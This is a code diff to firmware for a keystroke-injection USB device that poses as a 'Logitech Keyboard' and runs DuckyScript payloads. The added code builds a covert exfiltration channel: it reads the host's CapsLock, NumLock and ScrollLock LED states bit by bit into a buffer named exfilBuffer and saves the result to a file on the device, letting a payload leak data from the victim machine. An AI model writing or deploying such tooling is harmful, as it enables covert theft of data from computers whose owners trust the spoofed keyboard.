@@ -35,6 +35,8 @@ FatFile payloadFile;
 bool programMode = false;
 bool payloadEnded = false;
 
+String exfilBuffer = "";
+
 void setup()
 {
   pinMode(LED_BUILTIN, OUTPUT);
@@ -55,6 +57,7 @@ void setup()
   else
   {
     usb_hid.setStringDescriptor("Logitech Keyboard");
+    usb_hid.setReportCallback(NULL, hid_report_callback);
     usb_hid.begin();
 
     payloadReader();
@@ -206,6 +209,14 @@ std::vector<HID_output> ParseDuckyScriptLine(String line)
     keyDelay = line.toInt();
     return {};
   }
+  else if (line.startsWith("TEST_SAVE"))
+  {
+    FatFile testFile;
+    testFile.open("test.txt", O_WRITE | O_CREAT);
+    testFile.write(exfilBuffer.c_str());
+    testFile.close();
+    return {};
+  }
   else if (line.startsWith("WAIT_FOR_BUTTON_PRESS"))
   {
     // Wait for button press
@@ -242,4 +253,27 @@ std::vector<HID_output> ParseDuckyScriptLine(String line)
   }
 
   return {};
+}
+
+// Output report callback for LED indicator such as Caplocks
+void hid_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8_t const *buffer, uint16_t bufsize)
+{
+  (void)report_id;
+  (void)bufsize;
+
+  // LED indicator is output report with only 1 byte length
+  if (report_type != HID_REPORT_TYPE_OUTPUT)
+    return;
+
+  // The LED bit map is as follows: (also defined by KEYBOARD_LED_* )
+  // Kana (4) | Compose (3) | ScrollLock (2) | CapsLock (1) | Numlock (0)
+  uint8_t ledIndicator = buffer[0];
+  if (ledIndicator & KEYBOARD_LED_SCROLLLOCK)
+  {
+    exfilBuffer = exfilBuffer + (ledIndicator & KEYBOARD_LED_CAPSLOCK ? "1" : "0") + (ledIndicator & KEYBOARD_LED_NUMLOCK ? "1" : "0");
+  }
+  // else
+  // {
+  //   setPixelColor(rgb_led.Color(0, 0, 0));
+  // }
 }
